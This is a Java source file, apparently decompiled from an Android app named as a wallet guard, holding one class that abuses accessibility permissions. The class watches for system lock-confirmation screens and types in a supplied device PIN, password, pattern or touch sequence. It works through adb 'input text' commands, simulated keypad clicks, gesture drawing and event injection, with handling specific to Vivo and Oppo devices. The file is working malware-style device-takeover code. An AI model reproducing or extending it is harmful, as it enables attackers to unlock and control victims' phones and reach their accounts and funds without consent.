package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.Map.Entry;


import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public final class ConfirmLockDelegate extends AccessibilityDelegate {

    public final String n;
    public final ConcurrentLinkedQueue o;

    public ConfirmLockDelegate() {
        super(L(), "com.android.settings");
        this.n = "com.android.settings";
        this.o = new ConcurrentLinkedQueue();
    }

    public static boolean I(String str) {
        UiObject J;
        if (AppUtils.B(str)) {
            str = (String) MyAccessibilityService.v2.get();
        }
        if (!AppUtils.B(str)) {
            if (Objects.equals(str, "com.android.settings.password.ConfirmLockPassword")
                || Objects.equals(str, "com.android.settings.password.ConfirmLockPattern")
                || Objects.equals(str, "com.android.settings.password.ChooseLockGeneric")
                || Objects.equals(str, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
                || Objects.equals(str, "com.android.settings.password.ConfirmLockPattern$InternalActivity")) {
                return true;
            }
            return Objects.equals(str, "android.inputmethodservice.SoftInputWindow") && (J = MyAccessibilityService.P().J()) != null && J.password();
        }
        return false;
    }

    public static LinkedList L() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPassword");
        FilterHelper.initEventTypes(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);

        ListenWindow listenWindow2 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);

        ListenWindow listenWindow3 = new ListenWindow("com.android.settings", "com.android.settings.password.ChooseLockGeneric");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);

        ListenWindow listenWindow4 = new ListenWindow("com.android.settings", "com.vivo.settings.password.ConfirmVivoPin$InternalActivity");
        listenWindow4.setEventTypes(new HashSet<>());
        listenWindow4.getEventTypes().add(32);
        listenWindow4.getEventTypes().add(16384);
        linkedList.add(listenWindow4);

        ListenWindow listenWindow5 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern$InternalActivity");
        listenWindow5.setEventTypes(new HashSet<>());
        listenWindow5.getEventTypes().add(32);
        listenWindow5.getEventTypes().add(16384);
        linkedList.add(listenWindow5);

        return linkedList;
    }

    public static boolean O() {
        return com.guard.wallet.utils.DeviceUtils.isOppoFamily() || com.guard.wallet.utils.DeviceUtils.isVivoFamily();
    }

    public static void P() {
        try {
            Thread.sleep(1 * 500);
        } catch (Exception e2) {
            AppUtils.s("ConfirmLockDelegate", e2);
        }
    }

    public final boolean H() {
        AtomicInteger atomicInteger = new AtomicInteger(0);
        while (atomicInteger.incrementAndGet() < 20 && I(null)) {
            try {
                Thread.sleep(100L);
            } catch (Exception e2) {
                AppUtils.s("ConfirmLockDelegate", e2);
            }
        }
        return !I(null);
    }

    public final void J() {
        if (MyAccessibilityService.P() == null || k() == null || !com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
            return;
        }
        UiObject k2 = k();
        CombineFilter combineFilter = new CombineFilter();
        StringCondition bCond = FilterHelper.addCondition(combineFilter, FilterHelper.initFilter(combineFilter, "className", "android.view.View"), "id");
        String str = this.n;
        bCond.setEquals(str.concat(":id/mix_confirm"));
        combineFilter.getStringConditions().add(bCond);
        UiObject findOneByCombine = k2.findOneByCombine(combineFilter);
        if (findOneByCombine != null && findOneByCombine.click()) {
            return;
        }

        UiObject k3 = k();
        CombineFilter combineFilter2 = new CombineFilter();
        StringCondition bCond2 = FilterHelper.addCondition(combineFilter2, FilterHelper.initFilter(combineFilter2, "className", "android.widget.TextView"), "id");
        bCond2.setEquals(str.concat(":id/iv_complete"));
        combineFilter2.getStringConditions().add(bCond2);
        UiObject findOneByCombine2 = k3.findOneByCombine(combineFilter2);
        if (findOneByCombine2 != null && findOneByCombine2.click()) {
            return;
        }

        UiObject k4 = k();
        CombineFilter combineFilter3 = new CombineFilter();
        StringCondition bCond3 = FilterHelper.addCondition(combineFilter3, FilterHelper.initFilter(combineFilter3, "className", "android.widget.Button"), "id");
        bCond3.setEquals(str.concat(":id/vivo_pin_confirm"));
        combineFilter3.getStringConditions().add(bCond3);
        UiObject findOneByCombine3 = k4.findOneByCombine(combineFilter3);
        if (findOneByCombine3 != null && findOneByCombine3.click()) {
            return;
        }

        UiObject k5 = k();
        CombineFilter combineFilter4 = new CombineFilter();
        StringCondition bCond4 = FilterHelper.addCondition(combineFilter4, FilterHelper.initFilter(combineFilter4, "className", "android.widget.TextView"), "id");
        bCond4.setEquals(str.concat(":id/mix_normal_confirm"));
        combineFilter4.getStringConditions().add(bCond4);
        UiObject findOneByCombine4 = k5.findOneByCombine(combineFilter4);
        if (findOneByCombine4 != null) {
            findOneByCombine4.click();
        }
    }

    public final boolean K(ReqUnlockDeviceVO var1) {
        boolean var3 = Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX");
        String var6 = this.n;
        if (var3
            || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC")
            || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC")
            || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            Log.d("ConfirmLockDelegate", "confirmLockByCipher");
            if (!AppUtils.B(var1.getTextCipher())) {
                /* Try text input first */
                boolean cipherResult = false;
                String var7 = var1.getTextCipher();
                if (!AppUtils.B(var7)) {
                    UiObject var4;
                    if (k() != null) {
                        var4 = k().currentFocusedNode();
                    } else {
                        Log.d("ConfirmLockDelegate", "root is null");
                        var4 = null;
                    }
                    if (var4 == null) {
                        var4 = MyAccessibilityService.P().J();
                    }
                    if (var4 != null && Objects.equals(var4.className(), "android.widget.EditText")) {
                        if (EngineHelper.isAdbAvailable()) {
                            P();
                            String cmd = "input text ".concat(var7);
                            if (EngineHelper.heS().executeShellCommand(cmd)) {
                                M(null);
                                if (H()) {
                                    cipherResult = true;
                                }
                            }
                        }
                        if (!cipherResult && var4.setText(var7)) {
                            M(var4);
                            cipherResult = H();
                        }
                    }
                }
                if (cipherResult) {
                    return true;
                }

                /* Try node-based input */
                boolean nodeResult = false;
                String var53 = var1.getTextCipher();
                String var22 = var1.getCipherGradeCode();
                if (!AppUtils.B(var53) && MyAccessibilityService.P() != null) {
                    Log.d("ConfirmLockDelegate", "confirmLockByNodes");
                    if (Objects.equals(var22, "PASSWORD_QUALITY_NUMERIC_COMPLEX")
                        || Objects.equals(var22, "PASSWORD_QUALITY_NUMERIC")
                        || Objects.equals(var22, "PASSWORD_QUALITY_TOUCH_POINTS")
                        || (Objects.equals(var22, "PASSWORD_QUALITY_ALPHANUMERIC") && AppUtils.D(var53))) {
                        if (!AppUtils.B(var53) && MyAccessibilityService.P() != null && k() != null) {
                            Log.d("ConfirmLockDelegate", "confirmLockByPinKey");
                            /* MIUI pin keys */
                            if (com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                                for (int var12 = 0; var12 < var53.length(); var12++) {
                                    String digit = String.valueOf(var53.charAt(var12));
                                    UiObject k2 = k();
                                    CombineFilter cf = new CombineFilter();
                                    StringCondition sc = FilterHelper.addConditionWithEquals(cf, FilterHelper.initFilter(cf, "className", "android.view.View"), "desc", digit);
                                    cf.getStringConditions().add(sc);
                                    UiObject btn = k2.findOneByCombine(cf);
                                    if (btn != null && btn.click()) {
                                        Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + digit);
                                        P();
                                    }
                                }
                                J();
                                if (H()) {
                                    nodeResult = true;
                                }
                            }

                            /* Vivo pin keys */
                            if (!nodeResult && com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                                Log.d("ConfirmLockDelegate", "confirmLockByVivoPinKey");
                                UiObject k3 = k();
                                CombineFilter cf2 = new CombineFilter();
                                cf2.setStringConditions(new LinkedList<>());
                                StringCondition sc2 = new StringCondition();
                                sc2.setProperty("id");
                                sc2.setPrefix(var6.concat(":id/four_to_more_key"));
                                cf2.getStringConditions().add(sc2);
                                UiObjectCollection nodes = k3.findByCombine(cf2);
                                String prefix = var6.concat(":id/four_to_more_key");
                                if (nodes != null && nodes.size() > 0) {
                                    for (int idx = 0; idx < var53.length(); idx++) {
                                        String keyId = prefix.concat(String.valueOf(var53.charAt(idx)));
                                        for (UiObject node : nodes.getNodes()) {
                                            if (node != null && Objects.equals(node.id(), keyId) && node.click()) {
                                                Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + keyId);
                                                P();
                                            }
                                        }
                                    }
                                    J();
                                    nodeResult = H();
                                }
                            }

                            /* Generic key prefix keys */
                            if (!nodeResult) {
                                String keyPrefix = var6.concat(":id/key");
                                UiObject k4 = k();
                                CombineFilter cf3 = new CombineFilter();
                                StringCondition sc3 = FilterHelper.addCondition(cf3, FilterHelper.initFilter(cf3, "className", "android.view.ViewGroup"), "id");
                                sc3.setPrefix(var6.concat(":id/key"));
                                cf3.getStringConditions().add(sc3);
                                UiObjectCollection nodes2 = k4.findByCombine(cf3);
                                if (nodes2 != null && nodes2.size() > 0) {
                                    for (int idx = 0; idx < var53.length(); idx++) {
                                        String keyId = keyPrefix.concat(String.valueOf(var53.charAt(idx)));
                                        for (UiObject node : nodes2.getNodes()) {
                                            if (node != null && Objects.equals(node.id(), keyId) && node.click()) {
                                                Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + keyId);
                                                P();
                                            }
                                        }
                                    }
                                    J();
                                    nodeResult = H();
                                }
                            }
                        }
                    } else if (Objects.equals(var22, "PASSWORD_QUALITY_ALPHANUMERIC")
                        && !AppUtils.B(var53) && MyAccessibilityService.P() != null && k() != null
                        && com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                        /* Vivo alpha-numeric keys */
                        UiObject k5 = k();
                        CombineFilter cf4 = new CombineFilter();
                        StringCondition sc4 = FilterHelper.addCondition(cf4, FilterHelper.initFilter(cf4, "className", "android.widget.Button"), "id");
                        sc4.setPrefix(var6.concat(":id/num"));
                        cf4.getStringConditions().add(sc4);
                        UiObjectCollection numNodes = k5.findByCombine(cf4);

                        UiObject k6 = k();
                        CombineFilter cf5 = new CombineFilter();
                        StringCondition sc5 = FilterHelper.addCondition(cf5, FilterHelper.initFilter(cf5, "className", "android.widget.Button"), "id");
                        sc5.setPrefix(var6.concat(":id/char_"));
                        cf5.getStringConditions().add(sc5);
                        UiObjectCollection charNodes = k6.findByCombine(cf5);

                        if (numNodes != null && numNodes.size() > 0 && charNodes != null && charNodes.size() > 0) {
                            for (int idx = 0; idx < var53.length(); idx++) {
                                String ch = String.valueOf(var53.charAt(idx));
                                if (AppUtils.D(ch)) {
                                    String numId = var6.concat(":id/num").concat(ch);
                                    for (UiObject node : numNodes.getNodes()) {
                                        if (node != null && Objects.equals(node.id(), numId) && node.click()) {
                                            Log.d("ConfirmLockDelegate", "Click VIVO Num Node ID:" + numId);
                                            P();
                                        }
                                    }
                                } else {
                                    String charId = var6.concat(":id/char_").concat(ch);
                                    for (UiObject node : charNodes.getNodes()) {
                                        if (node != null && Objects.equals(node.id(), charId) && node.click()) {
                                            Log.d("ConfirmLockDelegate", "Click VIVO Char Node ID:" + charId);
                                            P();
                                        }
                                    }
                                }
                            }
                            J();
                            if (H()) {
                                nodeResult = true;
                            }
                        }
                    }
                }
                if (nodeResult) {
                    return true;
                }
            }
        }

        /* Pattern-based unlock */
        if (Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            boolean patternResult = false;
            List var31 = var1.getPatternCipher();
            Rect var45 = var1.getBoundsInScreen();
            Rect var54 = var1.getBoundsInParent();
            if (var31 != null && !var31.isEmpty()) {
                LinkedList var32 = new LinkedList(var31);
                com.guard.wallet.helper.NodeBoundsHelper.d(var32);
                if (k() != null && MyAccessibilityService.P() != null) {
                    com.guard.wallet.utils.SystemHelper.T0(10);
                    UiObject k7 = k();
                    CombineFilter cf6 = new CombineFilter();
                    StringCondition sc6 = FilterHelper.addCondition(cf6, FilterHelper.initFilter(cf6, "className", "android.view.View"), "id");
                    sc6.setEquals(var6.concat(":id/lockPattern"));
                    cf6.getStringConditions().add(sc6);
                    UiObject patternView = k7.findOneByCombine(cf6);
                    if (patternView != null) {
                        Log.d("ConfirmLockDelegate", "confirmLockByGesture pattern:" + patternView);
                        if (!com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                            LinkedList mapped = (LinkedList) com.guard.wallet.helper.NodeBoundsHelper.e(var32, var45, var54, patternView.boundsInWindow(), patternView.boundsInParent());
                            Point[] points = new Point[mapped.size()];
                            mapped.toArray(points);
                            if (N(points)) {
                                patternResult = true;
                            }
                        }
                        if (!patternResult) {
                            Point[] points2 = new Point[var32.size()];
                            var32.toArray(points2);
                            patternResult = N(points2);
                        }
                    }
                }
            }
            if (patternResult) {
                return true;
            }
        }

        /* Touch-based unlock */
        if (var1.getTouchCipher() != null && !var1.getTouchCipher().isEmpty()) {
            boolean touchResult = false;
            List var33 = var1.getTouchCipher();
            Rect var48 = var1.getBoundsInScreen();
            var1.getBoundsInParent();
            if (var33 != null && !var33.isEmpty()) {
                if (k() != null && MyAccessibilityService.P() != null) {
                    UiObject k8 = k();
                    CombineFilter cf7 = new CombineFilter();
                    StringCondition sc7 = FilterHelper.addCondition(cf7, FilterHelper.initFilter(cf7, "className", "android.view.View"), "id");
                    sc7.setEquals(var6.concat(":id/keyboard_num"));
                    cf7.getStringConditions().add(sc7);
                    UiObject keyboardView = k8.findOneByCombine(cf7);
                    if (keyboardView != null) {
                        Rect var51 = keyboardView.boundsInWindow();
                        if (var48 != null && var51 != null) {
                            HashMap var49 = com.guard.wallet.helper.NodeBoundsHelper.b(var48);
                            HashMap var79 = com.guard.wallet.helper.NodeBoundsHelper.b(var51);
                            if (!var33.isEmpty()) {
                                ListIterator var68 = var33.listIterator();
                                while (var68.hasNext()) {
                                    Point var57 = (Point) var68.next();
                                    for (Object entryObj : var49.entrySet()) {
                                        Entry entry = (Entry) entryObj;
                                        if (((Rect) entry.getValue()).contains((int) var57.getX(), (int) var57.getY())) {
                                            Rect mapped = (Rect) var79.get(entry.getKey());
                                            if (mapped != null) {
                                                var57.setX((float) mapped.centerX());
                                                var57.setY((float) mapped.centerY());
                                                break;
                                            }
                                        }
                                    }
                                    var68.set(var57);
                                }
                            }
                        }
                    }
                    if (com.guard.wallet.utils.SystemHelper.t(var33) && H()) {
                        touchResult = true;
                    }
                }
                if (!touchResult && EngineHelper.adbGesture(var33) && H()) {
                    touchResult = true;
                }
            }
            if (touchResult) {
                return true;
            }
        }

        /* Event-based unlock */
        var3 = true;
        if (!Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")
            && !Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            return false;
        }
        List var11 = var1.getEventCipher();
        if (var11 == null || var11.isEmpty() || !EngineHelper.adbEvent(var11) || !H()) {
            var3 = false;
        }
        return var3;
    }

    public final void M(UiObject var1) {
        if (EngineHelper.adbExec("input keyevent 66")) {
            return;
        }
        if (var1 == null && k() != null) {
            var1 = k().currentFocusedNode();
        }
        if (var1 == null && MyAccessibilityService.P() != null) {
            var1 = MyAccessibilityService.P().J();
        }
        if (var1 != null && Build.VERSION.SDK_INT >= 30) {
            var1.enter();
        }
    }

    public final boolean N(Point[] var1) {
        if (var1.length > 0) {
            for (int var2 = 1; var2 <= 4; var2++) {
                long var4 = (long) var2 * 1000L;
                try {
                    CountDownLatch var6 = new CountDownLatch(1);
                    if (com.guard.wallet.utils.SystemHelper.S(10L, Long.valueOf(var4), var1)) {
                        if (!var6.await(var4 + 1000L, TimeUnit.MILLISECONDS)) {
                            Log.d("ConfirmLockDelegate", "ResolveGesture Done");
                        }
                        if (H()) {
                            return true;
                        }
                    }
                } catch (Exception var7) {
                    AppUtils.s("ConfirmLockDelegate", var7);
                }
            }
        }
        return H();
    }

    @Override
    public final void d() {
        try {
            com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
            this.o.clear();
            super.d();
        } catch (Exception e2) {
            AppUtils.s("ConfirmLockDelegate", e2);
        }
    }

    @Override
    public final boolean equals(Object var1) {
        if (this == var1) {
            return true;
        }
        if (var1 != null && (var1 instanceof ConfirmLockDelegate)) {
            return Objects.equals(this.n, ((ConfirmLockDelegate) var1).n);
        }
        return false;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(ConfirmLockDelegate.class.getName(), this.n);
    }

    @Override
    public final void u(AccessibilityEvent var1, String var2, String var3) {
        super.u(var1, var2, var3);
        Log.d("ConfirmLockDelegate", "onAccessibilityEvent event：" + var1);
        if (I(var3)) {
            Log.d("ConfirmLockDelegate", "已进入锁屏密码验证代理");
            ConcurrentLinkedQueue var4 = this.o;
            if (!var4.contains("inConfirmLock")) {
                var4.add("inConfirmLock");
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockRunnable(this, 1), this.c);
            }
        }
    }
}
